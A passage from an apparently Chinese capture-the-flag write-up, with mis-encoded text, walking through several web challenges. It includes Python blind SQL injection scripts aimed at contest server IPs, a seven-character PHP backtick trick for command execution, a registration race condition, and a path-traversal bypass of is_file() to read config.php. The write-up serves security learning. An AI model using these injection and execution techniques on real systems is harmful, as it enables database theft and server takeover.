¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæƒ³åˆ°<a href="https://www.codemonster.cn/2017/10/31/2017-3th-fjwlkjaqds-writeup/">çœèµ›çš„æ³¨å…¥é¢˜</a><br>æµ‹è¯•äº†ä¸€ä¸‹<code>%1$&#39;</code>å¯ä»¥æˆåŠŸé€ƒé€¸å•å¼•å·ï¼Œæ„é€ ç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼Œåœ¨web1.keyçš„f14gå­—æ®µæ‰¾åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#by:CodeMonster</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line">payload=list(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ@1234567890qwertyuiopasdfghjklzxcvbnm_&#123;&#125;.!,"</span>)</span><br><span class="line">data=<span class="string">''</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">			header=&#123;<span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=b1kkq3ohuavj53kkl4u29dg914; token=SUIEVxUzVHYpEQEOFFIiXQ==;"</span>&#125;</span><br><span class="line">			url=<span class="string">"http://111.231.111.54/admin.php?id=1&amp;title="</span></span><br><span class="line">			<span class="comment">#url+="%1$%27%20or%20(ascii(mid((select%20group_concat(column_NAME)%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=database()%20and%20table_name=0x6b6579),&#123;0&#125;,1))=&#123;1&#125;)%23".format(i,ord(p))</span></span><br><span class="line">			url+=<span class="string">"%1$%27%20or%20(ascii(mid((select%20f14g%20from%20web1.key),&#123;0&#125;,1))=&#123;1&#125;)%23"</span>.format(i,ord(p))</span><br><span class="line">			<span class="comment">#print url</span></span><br><span class="line">			r1=r.get(url,headers=header)</span><br><span class="line">			<span class="comment">#print r1.text</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">"myblog"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">				flag+=p</span><br><span class="line">				<span class="keyword">print</span> i,flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢"><a href="#â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢" class="headerlink" title="â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢?"></a>â€œä»–ä»¬â€æœ‰ä»€ä¹ˆç§˜å¯†å‘¢?</h1><p>ä¸€ä¸ªç®€å•åˆ°ä¸èƒ½å†ç®€å•çš„â€¦â€¦<br><a href="http://182.254.246.93/" target="_blank" rel="noopener">http://182.254.246.93/</a></p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.entrance.php</span><br><span class="line">2.There is no need to scan and brute force!</span><br><span class="line">3.Hacking for fun!</span><br></pre></td></tr></table></figure></p>
<h2 id="0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å"><a href="#0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å" class="headerlink" title="0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å"></a>0x00å„ç§æ³¨å…¥éªšæ“ä½œå¾—åˆ°ä¸‹ä¸€å…³æ–‡ä»¶å</h2><p>entrance.phpå­˜åœ¨æŠ¥é”™æ³¨å…¥<br>æ„é€ <code>1 and linestring(pro_id)</code>å¾—åˆ°è¡¨å<code>product_2017ctf</code>å’Œæ•°æ®åº“å<code>youcanneverfindme17</code><br>é€šè¿‡joinæ³¨å…¥å¾—åˆ°å­—æ®µå<code>d067a0fa9dc61a6e</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id&#x3D;1 and (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¿™ä¸ªå­—æ®µåè¢«banäº†ï¼Œåªå¥½é€šè¿‡order byæ¥å¾—åˆ°d067a0fa9dc61a6eå­—æ®µçš„å†…å®¹ï¼Œè„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#by:CodeMonster</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.session()</span><br><span class="line">url=<span class="string">"http://182.254.246.93/entrance.php?"</span></span><br><span class="line">l=<span class="string">".0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">k=<span class="string">""</span></span><br><span class="line">sec=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(l)):</span><br><span class="line">		payload=sec+l[j]</span><br><span class="line">		data=&#123;<span class="string">"pro_id"</span>:<span class="string">"3 union select 1,'test',4,'&#123;&#125;' from product_2017ctf order by 4"</span>.format(payload)&#125;</span><br><span class="line">		r1=r.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'nextentrance'</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">			sec+=k</span><br><span class="line">			<span class="keyword">print</span> payload</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		k=l[j]</span><br><span class="line">		<span class="keyword">if</span> j==len(l)<span class="number">-1</span>:</span><br><span class="line">			sec+=k</span><br></pre></td></tr></table></figure><br>å¾—åˆ°çš„å†…å®¹å’Œå­—æ®µåæ‹¼æ¥å¾—åˆ°<code>d067a0fa9dc61a6e7195ca99696b5a896.php</code></p>
<h2 id="0x01ä¸ƒä¸ªå­—ç¬¦getshell"><a href="#0x01ä¸ƒä¸ªå­—ç¬¦getshell" class="headerlink" title="0x01ä¸ƒä¸ªå­—ç¬¦getshell"></a>0x01ä¸ƒä¸ªå­—ç¬¦getshell</h2><p>d067a0fa9dc61a6e7195ca99696b5a896.phpæ˜¯ä¸ªç±»ä¼¼ä¸Šä¼ çš„é¡µé¢ï¼Œå¯ä»¥åœ¨æœåŠ¡å™¨çš„ä¸€ä¸ªä¸“å±æ–‡ä»¶å¤¹ç”ŸæˆæŒ‡å®šæ–‡ä»¶åå’Œå†…å®¹çš„æ–‡ä»¶ï¼Œä¸€å¼€å§‹ä»¥ä¸ºå¯ä»¥é€šè¿‡<code>content[]</code>ç»•è¿‡é•¿åº¦é™åˆ¶ï¼Œæ— æœï¼Œç„¶ågoogleåˆ°äº†åŸé¢˜<br><a href="http://c.colabug.com/article-2421-1.html" target="_blank" rel="noopener">http://c.colabug.com/article-2421-1.html</a><br>ä¼ ä¸‰ä¸ªæ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ä»¶å    å†…å®¹</span><br><span class="line">bash      éšæ„</span><br><span class="line">bb        7ä¸ªå­—ç¬¦å†…çš„å‘½ä»¤</span><br><span class="line">z.php     &lt;?&#x3D;&#96;*&#96;;</span><br></pre></td></tr></table></figure><br><code>z.php</code>ä¸­çš„<code>&lt;?=`*`;</code>åˆšå¥½7ä¸ªå­—ç¬¦ï¼Œè®¿é—®åèƒ½æŠŠå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æŒ‰å­—æ¯é¡ºåºåˆ—å‡ºï¼Œç„¶åæ‰§è¡Œã€‚<br>ä¼ å¥½ä¸Šé¢3ä¸ªæ–‡ä»¶åï¼Œå½“å‰æ–‡ä»¶å¤¹å°±æœ‰4ä¸ªæ–‡ä»¶äº†ï¼ŒæŒ‰å­—æ¯æ’åºå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bb index.html(é¢˜ç›®è‡ªå¸¦) z.php</span><br></pre></td></tr></table></figure><br>è®¿é—®z.phpåï¼Œç›¸å½“äºæ‰§è¡Œäº†<code>bash bb index.php z.php</code><br>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡ä¿®æ”¹bbæ¥æ‰§è¡Œ7ä¸ªå­—ç¬¦ä»¥å†…çš„å‘½ä»¤<br>bbçš„å†…å®¹åˆ†åˆ«ä¸º<code>ls /</code>å’Œ<code>cat /3*</code><br><img src="/img/2017lctf1.png" alt=""></p>
<h1 id="èŒèŒå“’æŠ¥åç³»ç»Ÿ"><a href="#èŒèŒå“’æŠ¥åç³»ç»Ÿ" class="headerlink" title="èŒèŒå“’æŠ¥åç³»ç»Ÿ"></a>èŒèŒå“’æŠ¥åç³»ç»Ÿ</h1><p>å¤©ä¾èŠ±äº†ä¸€æ•´å¤©çš„æ—¶é—´ç”¨IDEå¼€å‘äº†ä¸€ä¸ªæŠ¥åç³»ç»Ÿï¼Œç°åœ¨å¥¹ç¡ç€äº†ï¼Œéš¾é“ä½ ä»¬ä¸æƒ³åšç‚¹ä»€ä¹ˆå˜›XD?<br><a href="http://123.206.120.239/" target="_blank" rel="noopener">http://123.206.120.239/</a></p>
<h2 id="0x00ä¸‹è½½æºç "><a href="#0x00ä¸‹è½½æºç " class="headerlink" title="0x00ä¸‹è½½æºç "></a>0x00ä¸‹è½½æºç </h2><p>æç¤ºäº†IDEå¼€å‘<br>æ‰«åˆ°äº†<code>http://123.206.120.239/.idea/workspace.xml</code><br><img src="/img/2017lctf5.png" alt=""><br>ä¸‹è½½åˆ°äº†æºç <br>login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'wrong password'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</span><br><span class="line">	<span class="comment">#echo $username;</span></span><br><span class="line">	header(<span class="string">"Location: member.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>member.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'please login first'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT identity FROM identities WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"None"</span>;</span><br><span class="line">		<span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			readfile($_GET[<span class="string">'file'</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">"./images/1.jpg"</span>&gt;</span><br><span class="line">&lt;object type=<span class="string">"application/x-shockwave-flash"</span> style=<span class="string">"outline:none;"</span> data=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span> width=<span class="string">"300"</span> height=<span class="string">"225"</span>&gt;&lt;param name=<span class="string">"movie"</span> value=<span class="string">"http://cdn.abowman.com/widgets/hamster/hamster.swf?"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"AllowScriptAccess"</span> value=<span class="string">"always"</span>&gt;&lt;/param&gt;&lt;param name=<span class="string">"wmode"</span> value=<span class="string">"opaque"</span>&gt;&lt;/param&gt;&lt;/object&gt;</span><br><span class="line">&lt;p style=<span class="string">"color:orange"</span>&gt;ä½ å¥½å•Šï¼Œä½†æ˜¯ä½ å¥½åƒä¸æ˜¯XDSECçš„äºº,æ‰€ä»¥æˆ‘å°±ä¸ç»™ä½ flagå•¦~~&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=xdcms'</span>, $user, $pass);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$admin = <span class="string">"xdsec"</span>.<span class="string">"###"</span>.str_shuffle(<span class="string">'you_are_the_member_of_xdsec_here_is_your_flag'</span>);</span><br><span class="line">    $username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">    $password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line">    $code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid input'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    <span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</span><br><span class="line">    $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</span><br><span class="line"></span><br><span class="line">    preg_match(<span class="string">'/^(xdsec)((?:###|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, :identity)'</span>);</span><br><span class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':identity'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO identities (username, identity) VALUES (:username, "GUEST")'</span>);</span><br><span class="line">        $sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="./index.html"&lt;/script&gt;'</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹"><a href="#0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹" class="headerlink" title="0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹"></a>0x01ç«äº‰ç»•è¿‡èº«ä»½æ£€æµ‹</h2><p>ä¸€å¼€å§‹ä¸€ç›´ä»¥ä¸ºè¦é¢„æµ‹<code>str_shuffle()</code>æ‰“ä¹±çš„å­—ç¬¦ä¸²ï¼Œæ— æœï¼Œåˆ†æä»£ç å‘ç°æ³¨å†Œçš„æ—¶å€™æ˜¯å…ˆå°†<code>ç”¨æˆ·åå¯†ç æ’å…¥æ•°æ®åº“</code>ï¼Œå†åˆ¤æ–­æ³¨å†Œç æ˜¯å¦æ­£ç¡®ï¼Œç„¶åæ’å…¥ç”¨æˆ·èº«ä»½ï¼Œè€Œmember.phpä¸­åˆ¤æ–­ç”¨æˆ·èº«ä»½çš„é€»è¾‘ç”¨çš„æ˜¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'GUEST'</span>) &#123;</span><br><span class="line">  $_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åªè¦ä¸ä¸º<code>GUEST</code>å³å¯æ‰§è¡Œåé¢çš„ä»£ç <br>æƒ³åˆ°é€šè¿‡ç«äº‰ï¼Œåœ¨<code>GUEST</code>è¿˜æ²¡æ›´æ–°è¿›æ•°æ®åº“çš„æ—¶å€™å°±ç™»å½•å¹¶è®¿é—®member.phpï¼Œä»è€Œè·³è¿‡èº«ä»½éªŒè¯<br>è¿™é‡Œæˆ‘çš„æ“ä½œæ˜¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.burpsuite Intruderæ— é™POST login.phpè¿›è¡Œç™»å½•æ“ä½œ</span><br><span class="line">2.burpsuite Intruderæ— é™GET member.php</span><br><span class="line">3.åœ¨å‰é¢ä¸¤ä¸ªéƒ½åœ¨è·‘çš„æƒ…å†µä¸‹æ³¨å†Œä¸€ä¸ªè´¦å·</span><br></pre></td></tr></table></figure><br>è¦æ³¨æ„çš„æ˜¯ä¸‰ä¸ªæ“ä½œçš„cookieå¿…é¡»ç›¸åŒï¼Œ1å’Œ3ä¸­çš„è´¦å·å¯†ç è¦ç›¸åŒï¼Œè¿™æ ·åœ¨æ³¨å†Œçš„åŒæ—¶å°±å®Œæˆäº†ç™»å½•æ“ä½œå¹¶ä¸”è®¿é—®äº†memberå¹¶ç»•è¿‡èº«ä»½æ£€æµ‹å¯ä»¥æ‰§è¡Œä¸‹ä¸€éƒ¨åˆ†ä»£ç <br>emmmmmmmmï¼Œçœ‹äº†æ“ä½œå’Œflagçš„å†…å®¹ï¼Œæ„Ÿè§‰æˆ‘ç”¨äº†éé¢„æœŸè§£ï¼Œé¢„æœŸè§£åº”è¯¥æ˜¯é€šè¿‡è¾“å…¥è¶…é•¿çš„<code>xdsec###</code>å¼€å¤´çš„å­—ç¬¦ä¸²è®©regiest.phpä¸­çš„æ­£åˆ™åŒ¹é…å‡½æ•°å´©æºƒï¼Œä»è€Œæ— æ³•æ³¨å…¥ç”¨æˆ·GUESTèº«ä»½ï¼Œåé¢çš„å°±éƒ½ä¸€æ ·äº†</p>
<h2 id="0x02æ–‡ä»¶åŒ…å«è¯»å–config-php"><a href="#0x02æ–‡ä»¶åŒ…å«è¯»å–config-php" class="headerlink" title="0x02æ–‡ä»¶åŒ…å«è¯»å–config.php"></a>0x02æ–‡ä»¶åŒ…å«è¯»å–config.php</h2><p>å…³é”®ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"None"</span>;</span><br><span class="line"><span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  readfile($_GET[<span class="string">'file'</span>]);</span><br></pre></td></tr></table></figure><br>è¿™é‡Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;.&#x2F;x&#x2F;..&#x2F;config.php</span><br></pre></td></tr></table></figure><br>å› ä¸ºxæ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å°±èƒ½ç»•è¿‡<code>is_file()</code>è¯»å–åˆ°<code>config.php</code>ï¼Œflagå°±åœ¨é‡Œé¢<br><img src="/img/2017lctf6.png" alt=""></p>
<h1 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h1><p>è¿™æ˜¯ä¸€ä¸ªæ‹¼æ‰‹é€ŸæŠ¢é‚€è¯·ç çš„é¢˜<br><a href="http://211.159.161.162/test.php" target="_blank" rel="noopener">http://211.159.161.162/test.php</a><br>hint: æœ¬åœ°</p>
